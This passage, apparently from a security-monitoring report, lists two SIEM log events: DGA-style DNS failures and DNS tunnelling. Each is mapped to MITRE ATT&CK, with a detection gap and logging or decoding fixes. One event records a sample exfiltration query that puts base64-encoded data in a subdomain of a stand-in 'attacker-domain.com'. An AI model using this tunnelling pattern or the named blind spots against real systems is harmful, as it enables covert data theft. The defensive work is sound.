      {
        "@timestamp": "2026-05-24T18:03:40.890Z",
        "log.level": "info",
        "event": {
          "category": "network",
          "action": "dns-query-failed"
        },
        "host": { "name": "DESKTOP-WK-912" },
        "message": "High frequency DNS queries resolving to NXDOMAIN. 1,400 query failures recorded in 2 minutes.",
        "mitre_attack": {
          "tactic": { "id": "TA0011", "name": "Command & Control" },
          "technique": { "id": "T1071.004", "name": "Application Layer Protocol: DNS Traffic" }
        },
        "detection_status": "Blind Spot",
        "coverage_details": {
          "status": "no_coverage",
          "gap_id": "GAP-DNS-01",
          "summary": "Recursive DNS Cache Logging Latency",
          "gap_reason": "Recursive resolvers resolve queries but do not stream individual lookup failures (NXDOMAIN) or query rate baselines to the SIEM, preventing detection of DGA C2 channels.",
          "remediation": {
            "title": "Enable DNS Query Logging on Recursive Resolver",
            "impact": "Streams DNS request failures, identifying DGA beaconing activities in real-time.",
            "steps": [
              "Enable query logging on local DNS servers (Bind9, Windows DNS Server, or Infoblox) and ingest logs.",
              "In cloud environments, enable Route 53 Query Logging or Azure DNS Private Resolver Query Logs."
            ]
          }
        }
      },
      {
        "@timestamp": "2026-05-24T18:05:12.300Z",
        "log.level": "info",
        "event": {
          "category": "network",
          "action": "dns-query-sent"
        },
        "host": { "name": "DESKTOP-WK-912" },
        "destination": { "name": "U0VEU19TRUNSRVRfREFUQQ==.attacker-domain.com" },
        "message": "DNS Query sent: TXT record request for base64 encoded string.",
        "mitre_attack": {
          "tactic": { "id": "TA0010", "name": "Exfiltration" },
          "technique": { "id": "T1048.003", "name": "Exfiltration Over Alternative Protocol - DNS Tunneling" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "partial_coverage",
          "gap_id": "GAP-DNS-02",
          "summary": "DNS Payload Inspection Gap",
          "gap_reason": "DNS query logs record the query lengths and types, but the SIEM parser does not run regex decoders on the subdomain values to flag Base64/Hex exfiltration payloads, causing it to bypass standard threshold alerts.",
          "remediation": {
            "title": "Enable Regex Decoders on Subdomains in SIEM",
            "impact": "Decodes base64/hex characters inside DNS packets to check for cleartext exfiltrations.",
            "steps": [
              "Create an ingestion pipeline processor in Logstash / Sentinel to extract subdomains.",
              "Run decoder functions on subdomains whose length exceeds 30 characters.",
              "Alert on subdomains containing high entropy values."
            ]
          }
        }
      }
    ]
  }
};
